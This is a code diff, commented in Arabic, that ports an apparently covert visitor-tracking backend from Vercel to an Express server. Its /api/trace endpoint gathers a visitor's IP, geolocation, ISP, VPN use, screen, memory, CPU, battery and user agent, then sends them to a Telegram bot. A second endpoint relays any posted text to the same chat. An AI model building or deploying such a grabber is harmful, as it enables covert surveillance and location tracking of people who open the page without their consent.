@@ -1,23 +1,29 @@
-export default async function handler(req, res) {
+const express = require('express');
+const path = require('path');
+const fetch = require('node-fetch');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.static(path.join(__dirname, '.')));
+
+// محاكاة Vercel API Endpoints لتعمل على Render
+app.get('/api/trace', async (req, res) => {
     const { res: screenRes, lang, mem, cores, plat, bat } = req.query;
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
     
-    // استخدام متغيرات البيئة بدلاً من القيم الثابتة
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-        console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables");
-        return res.status(500).send("Configuration Error");
+        return res.status(500).send("Missing Config");
     }
 
     try {
-        // 1. جلب معلومات الشبكة (الشركة والموقع)
         const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
         const geo = await geoRes.json();
 
-        // 2. تجهيز المعلومات بشكل مرتب
         const networkType = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/ثابت";
         const vpnStatus = geo.proxy ? "⚠️ يستخدم VPN" : "✅ اتصال مباشر";
 
@@ -36,16 +42,36 @@ export default async function handler(req, res) {
                         `📱 **البصمة الكاملة:**\n\`${userAgent}\`\n\n` +
                         `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;
 
-        // 3. إرسال الرسالة
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
         });
-
-    } catch (error) {
-        console.error("Error:", error);
-    }
-
+    } catch (e) { console.error(e); }
     res.status(200).send("OK");
-}
+});
+
+app.post('/api/send', async (req, res) => {
+    const { text } = req.body;
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) return res.status(500).send("Missing Config");
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+        });
+        res.status(200).send("OK");
+    } catch (e) { console.error(e); res.status(500).send("Error"); }
+});
+
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
